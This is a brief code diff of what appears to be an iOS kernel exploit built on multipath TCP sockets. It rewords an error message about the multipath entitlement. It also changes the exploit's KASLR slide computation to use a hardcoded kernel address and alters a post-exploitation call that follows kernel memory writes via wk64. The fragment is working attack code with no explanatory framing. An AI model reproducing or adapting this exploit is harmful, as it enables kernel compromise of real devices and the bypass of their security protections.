@@ -68,7 +68,7 @@ void increase_limits() {
 int alloc_mptcp_socket() {
     int sock = socket(AF_MULTIPATH, SOCK_STREAM, 0);
     if (sock < 0) {
-        printf("socket failed\n");
+        printf("Socket creation failed, do you have the multipath entitlement, are you Apple Developer?\n");
         perror("");
         return -1;
     }
@@ -966,10 +966,10 @@ void brewbeer() {
     wk64(pipe + 0x00, 0);
     wk64(pipe + 0x08, 0);
     wk64(pipe + 0x10, 0);
-    uint64_t kaslr = kernel_vm_map -  offsets.kernel_map;
-    printf("kaslr: %#llx\n", kaslr);
+    
+    uint64_t kaslr =  ipc_space_kernel - 0xfffffff0075d5030;
     uint64_t base = 0xfffffff007004000 + kaslr;
-    post_exploitation(base, kaslr, 1);
+    post_exploitation(base, kaslr, 0);
     // that should have cleared everything up!
     printf("done!\n");
 }
